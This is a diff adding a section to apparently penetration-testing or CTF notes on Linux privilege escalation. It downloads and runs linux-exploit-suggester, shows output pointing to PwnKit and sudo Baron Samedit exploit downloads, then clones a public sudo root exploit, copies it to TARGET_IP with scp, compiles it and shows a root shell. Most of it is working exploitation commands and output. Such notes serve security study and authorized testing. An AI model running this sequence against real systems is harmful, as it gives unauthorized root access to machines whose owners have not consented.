@@ -1558,3 +1558,73 @@ Troubleshooting
 - Not checking local-only services.
 - Not checking process arguments for leaked credentials.
 - Not documenting the exact escalation path.
+
+
+#### linux-exploit-suggester
+
+```bash
+wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
+
+bash ./les.sh
+```
+
+e.g 
+
+```bash
+$ bash ./les.sh
+
+Available information:
+
+Kernel version: VERSION
+Architecture: x86_64
+Distribution: ubuntu
+Distribution version: VERSION
+...
+
+[+] [CVE-2021-4034] PwnKit
+
+   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
+   Exposure: probable
+   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
+   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main
+
+[+] [CVE-2021-3156] sudo Baron Samedit
+
+   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
+   Exposure: probable
+   Tags: mint=19,[ ubuntu=18|20 ], debian=10
+   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main
+
+[+] [CVE-2021-3156] sudo Baron Samedit 2
+
+   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
+   Exposure: probable
+   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
+   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main
+...
+```
+
+CVE-2021-3156  - sudo Baron Samedit 2
+
+```
+https://github.com/Whiteh4tWolf/Sudo-1.8.31-Root-Exploit
+```
+
+```bash
+└─$ git clone https://github.com/Whiteh4tWolf/Sudo-1.8.31-Root-Exploit    
+
+└─$ scp -i id_rsa -P 2222 ./Sudo-1.8.31-Root-Exploit/Makefile  username@TARGET_IP:/home/username/ 
+
+└─$ scp -i id_rsa -P 2222 ./Sudo-1.8.31-Root-Exploit/exploit.c  username@TARGET_IP:/home/username/ 
+
+└─$ scp -i id_rsa -P 2222 ./Sudo-1.8.31-Root-Exploit/shellcode.c  username@TARGET_IP:/home/username/ 
+```
+
+```bash
+sudo --version
+make
+./exploit
+# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
